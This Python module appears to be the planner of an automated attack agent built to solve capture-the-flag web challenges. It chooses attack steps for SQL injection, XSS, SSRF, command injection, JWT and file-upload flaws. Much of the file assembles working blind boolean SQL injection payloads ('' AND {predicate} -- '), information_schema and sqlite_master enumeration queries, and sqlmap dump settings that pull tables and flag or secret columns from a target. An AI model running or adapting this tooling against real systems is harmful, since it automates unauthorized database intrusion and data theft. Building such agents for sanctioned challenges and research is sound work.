from __future__ import annotations

import inspect
import logging
from collections.abc import Mapping, Sequence
from typing import Any, Protocol
from urllib.parse import urljoin

from .action import ActionIntent
from .blackboard.models import BlackboardState
from .classification import LLMVulnerabilityClassifier, VulnerabilityClassifier

AllowedAction = str | Mapping[str, object]
logger = logging.getLogger(__name__)


class Planner(Protocol):
    """Select one intent from StateMachine-provided actions only."""

    def plan(
        self,
        state: BlackboardState,
        allowed_actions: Sequence[AllowedAction],
    ) -> ActionIntent | None: ...


class DeterministicPlanner:
    """Small local Planner Adapter; no model, tool, or runtime integration."""

    def __init__(
        self,
        *,
        classifier: VulnerabilityClassifier | None = None,
        llm_classifier: LLMVulnerabilityClassifier | Any | None = None,
    ) -> None:
        self.classifier = classifier or VulnerabilityClassifier()
        self.llm_classifier = llm_classifier or LLMVulnerabilityClassifier(
            heuristic_classifier=self.classifier
        )

    FAILURE_THRESHOLD = 3
    STRATEGY_CHAINS: dict[str, tuple[str, ...]] = {
        "SQLInjection": ("BASELINE", "VALIDATION", "EXPLOITATION", "EXTRACTION"),
        "FileUpload": ("DISCOVERY", "BYPASS", "EXECUTION", "VERIFICATION"),
        "XSS": ("INPUT_MAPPING", "CONTEXT_ANALYSIS", "PAYLOAD_DELIVERY", "VALIDATION"),
        "SSRF": ("URL_DISCOVERY", "PROTOCOL_TEST", "INTERNAL_PROBE", "VERIFICATION"),
        "CommandInjection": (
            "PARAMETER_IDENTIFICATION",
            "DELIMITER_TEST",
            "EXECUTION",
            "VERIFICATION",
        ),
        "PrivilegeBypass": ("ROLE_ANALYSIS", "BOUNDARY_TEST", "IDOR_CHECK", "VALIDATION"),
        "JWT": ("TOKEN_DISCOVERY", "ALGORITHM_TEST", "SIGNATURE_TEST", "MODIFICATION"),
        "InfoDisclosure": ("PATH_SENSING", "SOURCE_ACCESS", "DATA_EXTRACTION", "REPORT"),
    }
    STRATEGY_ACTIONS: dict[str, tuple[str, ...]] = {
        "FileUpload": ("file_upload", "multipart_request", "content_discovery", "http_request"),
        "XSS": ("reflection_test", "context_analysis", "payload_delivery", "http_request"),
        "SSRF": ("url_discovery", "protocol_test", "internal_probe", "http_request"),
        "CommandInjection": ("parameter_identification", "delimiter_test", "command_execute", "http_request"),
        "PrivilegeBypass": ("role_analysis", "boundary_test", "idor_check", "http_request"),
        "JWT": ("token_discovery", "algorithm_test", "signature_test", "token_modify"),
        "InfoDisclosure": ("path_sensing", "source_access", "data_extraction", "http_request"),
    }

    def plan(
        self,
        state: BlackboardState,
        allowed_actions: Sequence[AllowedAction],
    ) -> ActionIntent | None:
        if (
            str(state.phase).upper() == "EXPLOITATION"
            and state.control.get("automation_terminal")
            and not state.control.get("script_retry_pending")
        ):
            return None
        if not allowed_actions:
            return None

        descriptors = list(allowed_actions)
        if not state.vulnerability_hypotheses:
            logger.warning(
                "[Planner] run_id=%s no vulnerability hypotheses, using allowed-action fallback",
                state.run_id,
            )
        strategy = self._select_strategy(state)
        strategy_descriptor = self._strategy_descriptor(state, descriptors, strategy)
        descriptor = strategy_descriptor or self._select_descriptor(state, descriptors)
        if isinstance(descriptor, Mapping):
            action_name = str(descriptor.get("name") or "")
            purpose = str(descriptor.get("purpose") or action_name)
            suggested_parameters = descriptor.get("parameters")
            parameters = dict(suggested_parameters) if isinstance(suggested_parameters, Mapping) else {}
        else:
            action_name = str(descriptor)
            purpose = action_name
            parameters = {}

        if not action_name:
            return None

        # The adapter may fill a generic target from Blackboard knowledge, but
        # it never invents an action outside the supplied allowed list.
        if action_name == "http_request" and "url" not in parameters:
            target_url = state.knowledge.get("target_url")
            if target_url:
                parameters["method"] = "GET"
                parameters["url"] = str(target_url)
        if action_name == "sql_boolean_compare":
            parameters.update(self._boolean_parameters(state))
        elif action_name == "oracle_expression_calibration":
            parameters.update(self._calibration_parameters(state))
        elif action_name == "mysql_metadata_discovery":
            parameters.update(self._metadata_parameters(state))
        elif action_name == "sql_extract":
            parameters.update(self._extraction_parameters(state))
        elif action_name == "request_capture":
            parameters.update(self._request_capture_parameters(state))
        elif action_name == "sqlmap_detect":
            parameters.update(self._sqlmap_detect_parameters(state))
        elif action_name == "sqlmap_run":
            parameters.update(self._sqlmap_run_parameters(state))
        elif action_name == "sqlite_metadata_discovery":
            parameters.update(self._sqlite_metadata_parameters(state))
        elif action_name == "script_run":
            parameters.update(self._script_parameters(state))

        metadata: dict[str, Any] = {"phase": state.phase, "source": "deterministic_planner"}
        if strategy is not None:
            chain = self.STRATEGY_CHAINS.get(strategy["type"], ())
            metadata.update(
                {
                    "vulnerability_type": strategy["type"],
                    "strategy_phase": strategy.get("phase") or (chain[0] if chain else "GENERIC"),
                    "strategy_chain": list(chain),
                    "strategy_index": strategy.get("index", 0),
                }
            )
            logger.info(
                "[Planner] run_id=%s selected %s confidence=%s action=%s",
                state.run_id,
                strategy["type"],
                self._strategy_confidence(state, strategy["type"]),
                action_name,
            )
        return ActionIntent(
            action_name=action_name,
            reason=f"select allowed action: {purpose}",
            parameters=parameters,
            metadata=metadata,
        )

    async def _classify_task(
        self,
        challenge_context: Any,
        initial_response: Mapping[str, Any] | None,
    ) -> list[dict[str, Any]]:
        """Prefer the configured LLM classifier, then use local heuristics."""
        try:
            result = self.llm_classifier.classify(challenge_context, initial_response or {})
            if inspect.isawaitable(result):
                result = await result
            if result:
                return list(result)
        except Exception:
            # Classification is advisory. The deterministic fallback keeps
            # the Solver loop available when a provider is unavailable.
            pass
        return self.classifier.classify(challenge_context, initial_response or {})

    def apply_feedback(
        self,
        state: BlackboardState,
        *,
        success: bool,
        new_evidence: bool,
    ) -> BlackboardState:
        """Persist strategy failure accounting without executing or authorizing actions."""
        hypotheses = [dict(item) for item in state.vulnerability_hypotheses]
        strategy = self._select_strategy(state)
        if not hypotheses or strategy is None or strategy["type"] == "GENERIC":
            return state.copy_for_read()

        active_type = str(strategy["type"])
        current = next((item for item in hypotheses if item.get("type") == active_type), None)
        if current is None:
            return state.copy_for_read()
        failures = int(current.get("failed_attempts") or 0)
        if not success or not new_evidence:
            failures += 1
        current["failed_attempts"] = failures

        control = dict(state.control)
        control["strategy_attempts"] = failures
        control["active_vulnerability_type"] = active_type
        if success and new_evidence and active_type != "SQLInjection":
            chain = self.STRATEGY_CHAINS.get(active_type, ())
            current_phase = str(control.get("strategy_phase") or "")
            current_index = chain.index(current_phase) if current_phase in chain else 0
            if current_index + 1 < len(chain):
                control.update(
                    {
                        "strategy_phase": chain[current_index + 1],
                        "strategy_attempts": 0,
                    }
                )
        if failures >= self.FAILURE_THRESHOLD:
            current["tested"] = True
            next_hypothesis = self._next_hypothesis(hypotheses, active_type)
            if next_hypothesis is not None:
                next_type = str(next_hypothesis["type"])
                control.update(
                    {
                        "active_vulnerability_type": next_type,
                        "strategy_phase": self.STRATEGY_CHAINS.get(next_type, ("GENERIC",))[0],
                        "strategy_attempts": 0,
                        "strategy_switch_count": int(control.get("strategy_switch_count") or 0) + 1,
                        "strategy_switched_from": active_type,
                    }
                )
            else:
                control.update(
                    {
                        "active_vulnerability_type": None,
                        "generic_fallback": True,
                        "reassessment_requested": True,
                    }
                )
        return state.model_copy(
            update={"vulnerability_hypotheses": hypotheses, "control": control},
            deep=True,
        )

    def _select_strategy(self, state: BlackboardState) -> dict[str, Any] | None:
        if not state.vulnerability_hypotheses:
            return None
        active = str(state.control.get("active_vulnerability_type") or "")
        candidates = [
            item
            for item in state.vulnerability_hypotheses
            if isinstance(item, Mapping)
            and float(item.get("confidence") or 0) > 0.3
            and item.get("tested") is not True
            and int(item.get("failed_attempts") or 0) < self.FAILURE_THRESHOLD
        ]
        candidates.sort(key=lambda item: (-float(item.get("confidence") or 0), str(item.get("type") or "")))
        selected = next((item for item in candidates if str(item.get("type")) == active), None)
        selected = selected or (candidates[0] if candidates else None)
        if selected is None:
            return {"type": "GENERIC", "phase": "GENERIC", "index": 0}
        vulnerability_type = str(selected.get("type") or "GENERIC")
        chain = self.STRATEGY_CHAINS.get(vulnerability_type, ("GENERIC",))
        phase = str(state.control.get("strategy_phase") or "")
        index = chain.index(phase) if phase in chain else 0
        return {"type": vulnerability_type, "phase": chain[index], "index": index}

    @staticmethod
    def _strategy_confidence(state: BlackboardState, vulnerability_type: str) -> float | None:
        for item in state.vulnerability_hypotheses:
            if isinstance(item, Mapping) and str(item.get("type")) == vulnerability_type:
                try:
                    return float(item.get("confidence") or 0)
                except (TypeError, ValueError):
                    return None
        return None

    def _strategy_descriptor(
        self,
        state: BlackboardState,
        descriptors: list[AllowedAction],
        strategy: dict[str, Any] | None,
    ) -> AllowedAction | None:
        if strategy is None or strategy["type"] == "SQLInjection":
            return None
        names = [str(item.get("name") if isinstance(item, Mapping) else item) for item in descriptors]
        preferred = self.STRATEGY_ACTIONS.get(strategy["type"], ("http_request",))
        for action_name in preferred:
            if action_name in names:
                return descriptors[names.index(action_name)]
        return descriptors[0] if descriptors else None

    def _next_hypothesis(
        self,
        hypotheses: list[dict[str, Any]],
        active_type: str,
    ) -> dict[str, Any] | None:
        candidates = [
            item
            for item in hypotheses
            if str(item.get("type") or "") != active_type
            and item.get("tested") is not True
            and float(item.get("confidence") or 0) > 0.3
        ]
        return max(candidates, key=lambda item: float(item.get("confidence") or 0), default=None)

    @staticmethod
    def _select_descriptor(state: BlackboardState, descriptors: list[AllowedAction]) -> AllowedAction:
        if str(state.phase).upper() == "EXPLOITATION":
            script_attempts = sum(
                1
                for item in (state.history or [])
                if isinstance(item, Mapping) and item.get("action") == "script_run"
            )
            if state.control.get("script_retry_pending") and script_attempts < 2:
                for item in descriptors:
                    name = str(item.get("name") if isinstance(item, Mapping) else item)
                    if name == "script_run":
                        return item
            facts = list(state.knowledge.get("verified_facts") or [])
            has_columns = any(item.get("type") == "COLUMNS_DISCOVERED" for item in facts if isinstance(item, Mapping))
            has_profile = any(item.get("type") == "ADAPTIVE_EXTRACTION_PROFILE" for item in facts if isinstance(item, Mapping))
            metadata_failures = int(state.control.get("metadata_failures") or 0)
            if metadata_failures >= 2:
                request_captured = bool(state.control.get("request_captured"))
                sqlmap_detected = bool(state.control.get("sqlmap_detected"))
                sqlmap_stage = str(state.control.get("sqlmap_stage") or "")
                sqlite_attempted = bool(state.control.get("sqlite_attempted"))
                has_tables = any(item.get("type") == "TABLES_DISCOVERED" for item in facts if isinstance(item, Mapping))
                has_columns = any(item.get("type") == "COLUMNS_DISCOVERED" for item in facts if isinstance(item, Mapping))
                has_database_version = any(item.get("type") == "DB_VERSION_DISCOVERED" for item in facts if isinstance(item, Mapping))
                script_history = any(
                    isinstance(item, Mapping) and item.get("action") == "script_run"
                    for item in (state.history or [])
                )
                if (
                    state.control.get("generic_fallback_done")
                    and not state.knowledge.get("findings")
                    and not script_history
                ):
                    for item in descriptors:
                        name = str(item.get("name") if isinstance(item, Mapping) else item)
                        if name == "script_run":
                            return item
                for item in descriptors:
                    name = str(item.get("name") if isinstance(item, Mapping) else item)
                    if not request_captured and name == "request_capture":
                        return item
                    if request_captured and not sqlmap_detected and name == "sqlmap_detect":
                        if sqlmap_stage != "detect_failed":
                            return item
                    if sqlmap_stage == "detect_failed" and not sqlite_attempted and name == "sqlite_metadata_discovery":
                        return item
                    if sqlite_attempted and has_columns and name == "sql_extract":
                        return item
                    if sqlite_attempted and not has_tables and not has_columns and not has_database_version and not state.control.get("metadata_version_attempted") and not state.control.get("generic_fallback_pending") and name == "mysql_metadata_discovery":
                        return item
                    if state.control.get("metadata_version_attempted") and not state.control.get("generic_fallback_done") and name == "sql_extract":
                        return item
                    if sqlmap_detected and name == "sqlmap_run" and sqlmap_stage not in {"completed", "detect_failed"}:
                        return item
            for item in descriptors:
                name = str(item.get("name") if isinstance(item, Mapping) else item)
                if has_columns and name == "sql_extract":
                    return item
                if not has_profile and name == "oracle_expression_calibration":
                    return item
                if has_profile and name == "mysql_metadata_discovery":
                    return item
        if str(state.phase).upper() == "VALIDATION":
            surface = DeterministicPlanner._surface(state)
            tested = set(str(item) for item in (state.control.get("tested_parameters") or []))
            fields = [str(item) for item in surface.get("fields") or []]
            for item in descriptors:
                name = str(item.get("name") if isinstance(item, Mapping) else item)
                if name == "sql_boolean_compare" and any(field not in tested for field in fields):
                    return item
        return descriptors[0]

    @staticmethod
    def _surface(state: BlackboardState) -> dict:
        for item in reversed(list(state.knowledge.get("verified_facts") or [])):
            if isinstance(item, Mapping) and item.get("type") == "HTTP_SURFACE_DISCOVERED":
                return dict(item)
        return {}

    @staticmethod
    def _request_from_surface(state: BlackboardState) -> dict:
        surface = DeterministicPlanner._surface(state)
        base = str(state.knowledge.get("target_url") or "")
        endpoint = str(surface.get("endpoint") or base)
        url = urljoin(base if base.endswith("/") else base + "/", endpoint)
        controls = dict(surface.get("control_values") or {})
        return {
            "method": str(surface.get("method") or "POST").upper(),
            "url": url,
            "headers": {"Content-Type": "application/json"},
            "json": controls,
        }

    @staticmethod
    def _boolean_parameters(state: BlackboardState) -> dict:
        surface = DeterministicPlanner._surface(state)
        controls = dict(surface.get("control_values") or {})
        fields = [str(item) for item in surface.get("fields") or []]
        tested = set(str(item) for item in (state.control.get("tested_parameters") or []))
        field = next((item for item in fields if item not in tested), fields[0] if fields else "department")
        baseline = str(controls.get(field) or "")
        other_controls = {key: value for key, value in controls.items() if key != field}
        request = DeterministicPlanner._request_from_surface(state)
        request["json"] = dict(controls)
        return {
            "request": request,
            "test_field": field,
            "control_fields": other_controls,
            "oracle": {"json_field": "matched", "true_value": True, "false_value": False},
            "baseline_value": baseline,
            "max_requests": 5,
        }

    @staticmethod
    def _calibration_parameters(state: BlackboardState) -> dict:
        surface = DeterministicPlanner._surface(state)
        controls = dict(surface.get("control_values") or {})
        field = str(state.control.get("tested_parameter") or "department")
        baseline = str(controls.get(field) or "")
        return {
            "dbms": "mysql",
            "request": DeterministicPlanner._request_from_surface(state),
            "test_field": field,
            "baseline_value": baseline,
            "control_fields": {key: value for key, value in controls.items() if key != field},
            "oracle": {"json_field": "matched", "true_value": True, "false_value": False},
            "predicate_template": "' AND {predicate} -- ",
            "matrix": [
                {"level": 2, "name": "substring", "primitive": "substring", "function": "SUBSTRING", "true": "SUBSTRING('ABC',1,1)='A'", "false": "SUBSTRING('ABC',1,1)='B'", "capability": "substring_supported"},
                {"level": 2, "name": "hex_substring", "primitive": "hex", "function": "HEX", "true": "HEX(SUBSTRING('ABC',1,1))='41'", "false": "HEX(SUBSTRING('ABC',1,1))='42'", "capability": "hex_supported"},
                {"level": 3, "name": "scalar_subquery", "true": "(SELECT 1)=1", "false": "(SELECT 1)=2", "capability": "scalar_subquery_oracle_confirmed"},
                {"level": 4, "name": "mysql_database", "true": "DATABASE() IS NOT NULL", "false": "DATABASE() IS NULL", "capability": "mysql_dbms_confirmed"},
            ],
            "repeats_per_expression": 2,
            "max_calibration_requests": 160,
            "supporting_evidence_ids": list(state.evidence_refs),
        }

    @staticmethod
    def _metadata_parameters(state: BlackboardState) -> dict:
        facts = [item for item in (state.knowledge.get("verified_facts") or []) if isinstance(item, Mapping)]
        surface = DeterministicPlanner._surface(state)
        request = DeterministicPlanner._request_from_surface(state)
        controls = dict(surface.get("control_values") or {})
        field = str(state.control.get("tested_parameter") or "department")
        baseline = str(controls.get(field) or "")
        common = {
            "request": request,
            "test_field": field,
            "baseline_value": baseline,
            "control_fields": {key: value for key, value in controls.items() if key != field},
            "oracle": {"json_field": "matched", "true_value": True, "false_value": False},
            "max_requests": 2000,
        }
        tables_fact = next((item for item in facts if item.get("type") == "TABLES_DISCOVERED"), None)
        columns_fact = next((item for item in facts if item.get("type") == "COLUMNS_DISCOVERED"), None)
        provenance = {"supporting_evidence_ids": list(state.evidence_refs)}
        if int(state.control.get("metadata_failures") or 0) >= 3 and not state.control.get("metadata_version_attempted"):
            return {
                **common,
                **provenance,
                "stage": "version",
                "target_expression": "VERSION()",
                "expression_type": "METADATA_DISCOVERY",
                "extraction_profile": dict(next((item.get("profile") or {} for item in facts if item.get("type") == "ADAPTIVE_EXTRACTION_PROFILE"), {})),
            }
        if columns_fact:
            return {**common, **provenance, "stage": "columns", "target_expression": "information_schema.columns", "candidate_table": str((tables_fact or {}).get("tables", [{}])[0].get("name") or ""), "expression_type": "METADATA_DISCOVERY", "extraction_profile": dict(columns_fact.get("extraction_profile") or {})}
        if tables_fact:
            return {**common, **provenance, "stage": "columns", "target_expression": "information_schema.columns", "candidate_table": str((tables_fact.get("tables") or [{}])[0].get("name") or ""), "expression_type": "METADATA_DISCOVERY", "extraction_profile": dict((tables_fact.get("extraction_profile") or {}))}
        if any(item.get("type") == "DATABASE_DISCOVERED" for item in facts):
            return {**common, **provenance, "stage": "tables", "target_expression": "information_schema.tables", "expression_type": "METADATA_DISCOVERY", "extraction_profile": dict(next((item.get("profile") or {} for item in facts if item.get("type") == "ADAPTIVE_EXTRACTION_PROFILE"), {}))}
        # A database-name extraction failure is recoverable and does not
        # invalidate the verified Boolean oracle.  The metadata executor can
        # enumerate tables through DATABASE() without first exposing the
        # database name, so switch strategy after the first bounded failure
        # instead of replaying the same fingerprint indefinitely.
        if int(state.control.get("metadata_failures") or 0) >= 1:
            return {
                **common,
                **provenance,
                "stage": "tables",
                "target_expression": "information_schema.tables",
                "expression_type": "METADATA_DISCOVERY",
                "extraction_profile": dict(
                    next(
                        (item.get("profile") or {} for item in facts if item.get("type") == "ADAPTIVE_EXTRACTION_PROFILE"),
                        {},
                    )
                ),
            }
        return {**common, **provenance, "stage": "database", "target_expression": "DATABASE()", "expression_type": "METADATA_DISCOVERY", "extraction_profile": dict(next((item.get("profile") or {} for item in facts if item.get("type") == "ADAPTIVE_EXTRACTION_PROFILE"), {}))}

    @staticmethod
    def _extraction_parameters(state: BlackboardState) -> dict:
        facts = [item for item in (state.knowledge.get("verified_facts") or []) if isinstance(item, Mapping)]
        table_fact = next((item for item in facts if item.get("type") == "TABLES_DISCOVERED"), {})
        columns_fact = next((item for item in facts if item.get("type") == "COLUMNS_DISCOVERED"), {})
        table_rows = table_fact.get("tables") or []
        table_item = table_rows[0] if table_rows else {}
        raw_table_name = table_item.get("name") if isinstance(table_item, Mapping) else table_item
        table_name = str(raw_table_name).strip() if raw_table_name not in (None, "") else ""
        if table_name and not (columns_fact.get("columns") or []):
            offset = int(state.control.get("generic_column_offset") or 0)
            return {
                "dbms": "mysql",
                "request": DeterministicPlanner._request_from_surface(state),
                "test_field": str(state.control.get("tested_parameter") or "department"),
                "baseline_value": str(DeterministicPlanner._surface(state).get("control_values", {}).get(str(state.control.get("tested_parameter") or "department")) or ""),
                "control_fields": {key: value for key, value in (DeterministicPlanner._surface(state).get("control_values") or {}).items() if key != str(state.control.get("tested_parameter") or "department")},
                "target_expression": f"SELECT name FROM pragma_table_info('{table_name.replace(chr(39), chr(39) * 2)}') LIMIT 1 OFFSET {offset}",
                "expression_type": "METADATA_DISCOVERY",
                "oracle": {"json_field": "matched", "true_value": True, "false_value": False},
                "max_requests": 512,
                "max_length": 128,
                "supporting_evidence_ids": list(state.evidence_refs),
            }
        if state.control.get("generic_fallback_pending") and not state.control.get("generic_fallback_done"):
            source = str(state.control.get("generic_fallback_source") or "mysql")
            index = int(state.control.get("generic_fallback_index") or 0)
            surface = DeterministicPlanner._surface(state)
            controls = dict(surface.get("control_values") or {})
            field = str(state.control.get("tested_parameter") or "department")
            base = {
                "dbms": "mysql",
                "request": DeterministicPlanner._request_from_surface(state),
                "test_field": field,
                "baseline_value": str(controls.get(field) or ""),
                "control_fields": {key: value for key, value in controls.items() if key != field},
                "oracle": {"json_field": "matched", "true_value": True, "false_value": False},
                "max_requests": 512,
                "max_length": 128,
                "supporting_evidence_ids": list(state.evidence_refs),
            }
            if source == "mysql":
                if index == 0:
                    expression = "SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=DATABASE()"
                else:
                    table_fact = next((item for item in facts if item.get("type") == "TABLES_DISCOVERED"), {})
                    table_rows = table_fact.get("tables") or []
                    table = str((table_rows[0].get("name") if isinstance(table_rows[0], Mapping) else table_rows[0]) if table_rows else "")
                    expression = f"SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='{table}'"
                return {**base, "target_expression": expression, "expression_type": "METADATA_DISCOVERY"}
            if index == 1:
                expression = "SELECT GROUP_CONCAT(name) FROM sqlite_master WHERE type='table'"
            elif index == 2:
                offset = int(state.control.get("generic_table_offset") or 0)
                expression = f"SELECT name FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%' LIMIT 1 OFFSET {offset}"
            else:
                table_fact = next((item for item in facts if item.get("type") == "TABLES_DISCOVERED"), {})
                table_rows = table_fact.get("tables") or []
                table = str((table_rows[0].get("name") if isinstance(table_rows[0], Mapping) else table_rows[0]) if table_rows else "")
                offset = int(state.control.get("generic_column_offset") or 0)
                expression = f"SELECT name FROM pragma_table_info('{table}') LIMIT 1 OFFSET {offset}"
            return {**base, "target_expression": expression, "expression_type": "METADATA_DISCOVERY"}
        tables = table_fact.get("tables") or []
        columns = columns_fact.get("columns") or []
        table_item = tables[0] if tables else {}
        table = str(table_item.get("name") if isinstance(table_item, Mapping) else table_item or "")
        def item_name(item: object) -> str:
            return str(item.get("name") if isinstance(item, Mapping) else item or "")
        candidate = next((item_name(item) for item in columns if item_name(item).casefold() in {"flag", "secret", "value"}), "")
        candidate = candidate or item_name(columns[0]) if columns else ""
        expression = f"SELECT {candidate} FROM {table} LIMIT 1" if table and candidate else "SELECT DATABASE()"
        return {
            "dbms": "mysql",
            "request": DeterministicPlanner._request_from_surface(state),
            "test_field": str(state.control.get("tested_parameter") or "department"),
            "baseline_value": str(DeterministicPlanner._surface(state).get("control_values", {}).get(str(state.control.get("tested_parameter") or "department")) or ""),
            "control_fields": {key: value for key, value in (DeterministicPlanner._surface(state).get("control_values") or {}).items() if key != str(state.control.get("tested_parameter") or "department")},
            "target_expression": expression,
            "expression_type": "FLAG_SEARCH",
            "oracle": {"json_field": "matched", "true_value": True, "false_value": False},
            "max_requests": 512,
            "max_length": 128,
            "supporting_evidence_ids": list(state.evidence_refs),
        }

    @staticmethod
    def _request_capture_parameters(state: BlackboardState) -> dict:
        request = DeterministicPlanner._request_from_surface(state)
        return {
            "method": request.get("method", "POST"),
            "url": request.get("url"),
            "headers": request.get("headers") or {"Content-Type": "application/json"},
            "json": request.get("json") or {},
        }

    @staticmethod
    def _sqlmap_detect_parameters(state: BlackboardState) -> dict:
        return {
            "request_file": str(state.control.get("request_file") or "requests/exploit.req"),
            "parameter": str(state.control.get("tested_parameter") or "department"),
            "level": 1,
            "risk": 1,
            "timeout_seconds": 120,
        }

    @staticmethod
    def _sqlmap_run_parameters(state: BlackboardState) -> dict:
        facts = [item for item in (state.knowledge.get("verified_facts") or []) if isinstance(item, Mapping)]
        databases = next((item.get("databases") for item in facts if item.get("type") == "SQLMAP_DATABASES"), []) or []
        tables = next((item.get("tables") for item in facts if item.get("type") == "SQLMAP_TABLES"), []) or []
        columns = next((item.get("columns") for item in facts if item.get("type") == "SQLMAP_COLUMNS"), []) or []
        database = str((databases[0] if databases else "") or "")
        table = str((tables[0] if tables else "") or "")
        column_names = [str(item) for item in columns if str(item)]
        if columns:
            action = "dump_target"
        elif tables:
            action = "columns"
        elif databases:
            action = "tables"
        else:
            action = "dbs"
        values: dict[str, object] = {
            "request_file": str(state.control.get("request_file") or "requests/exploit.req"),
            "parameter": str(state.control.get("tested_parameter") or "department"),
            "action": action,
            "level": 1,
            "risk": 1,
            "threads": 1,
            "timeout_seconds": 180,
            "techniques": ["B"],
            # The Gateway provenance gate requires a verified expression for
            # sqlmap_run even though SQLMap consumes the captured request.
            "target_expression": "DATABASE()",
            "expression_type": "METADATA_DISCOVERY",
        }
        if database:
            values["database"] = database
        if table:
            values["table"] = table
        if column_names:
            values["columns"] = column_names[:8]
        return values

    @staticmethod
    def _sqlite_metadata_parameters(state: BlackboardState) -> dict:
        facts = [item for item in (state.knowledge.get("verified_facts") or []) if isinstance(item, Mapping)]
        tables_fact = next((item for item in facts if item.get("type") == "TABLES_DISCOVERED"), {})
        tables = tables_fact.get("tables") or []
        table = ""
        if tables:
            first = tables[0]
            table = str(first.get("name") if isinstance(first, Mapping) else first)
        target_expression = "sqlite_master"
        if table:
            target_expression = f"pragma_table_info('{table}')"
        surface = DeterministicPlanner._surface(state)
        controls = dict(surface.get("control_values") or {})
        field = str(state.control.get("tested_parameter") or "department")
        return {
            "request": DeterministicPlanner._request_from_surface(state),
            "test_field": field,
            "baseline_value": str(controls.get(field) or ""),
            "target_expression": target_expression,
            "expression_type": "METADATA_DISCOVERY",
            "supporting_evidence_ids": list(state.evidence_refs),
            "max_requests": 512,
        }

    @staticmethod
    def _script_parameters(state: BlackboardState) -> dict:
        surface = DeterministicPlanner._surface(state)
        profile = next(
            (
                item.get("profile") or {}
                for item in (state.knowledge.get("verified_facts") or [])
                if isinstance(item, Mapping) and item.get("type") == "ADAPTIVE_EXTRACTION_PROFILE"
            ),
            {},
        )
        field = str(state.control.get("tested_parameter") or "department")
        controls = dict(surface.get("control_values") or {})
        return {
            "request": DeterministicPlanner._request_from_surface(state),
            "test_field": field,
            "baseline_value": str(controls.get(field) or ""),
            "predicate_template": str(profile.get("predicate_template") or "' AND {predicate} -- "),
            "max_requests": 2000,
            "max_length": 64,
            "timeout_seconds": 60,
        }

    def choose(
        self,
        state: BlackboardState,
        allowed_actions: Sequence[AllowedAction],
    ) -> ActionIntent | None:
        """Phase 1.1 compatibility alias for the new ``plan`` method."""
        return self.plan(state, allowed_actions)


class NoopPlanner:
    """Placeholder planner retained for the Coordinator skeleton."""

    def plan(
        self,
        state: BlackboardState,
        allowed_actions: Sequence[AllowedAction],
    ) -> ActionIntent | None:
        return None

    def choose(
        self,
        state: BlackboardState,
        allowed_actions: Sequence[AllowedAction],
    ) -> ActionIntent | None:
        return self.plan(state, allowed_actions)


class SolverIntent(ActionIntent):
    """Phase 1.1 constructor compatibility; new code uses ActionIntent."""

    def __init__(self, action: str, arguments: dict | None = None) -> None:
        object.__setattr__(self, "action_name", action)
        object.__setattr__(self, "reason", "legacy solver intent")
        object.__setattr__(self, "parameters", dict(arguments or {}))
        object.__setattr__(self, "metadata", {"source": "phase_1_1_compatibility"})
        object.__setattr__(self, "action_id", None)
        object.__setattr__(self, "retry_of", None)

    @property
    def arguments(self) -> dict:
        return dict(self.parameters)
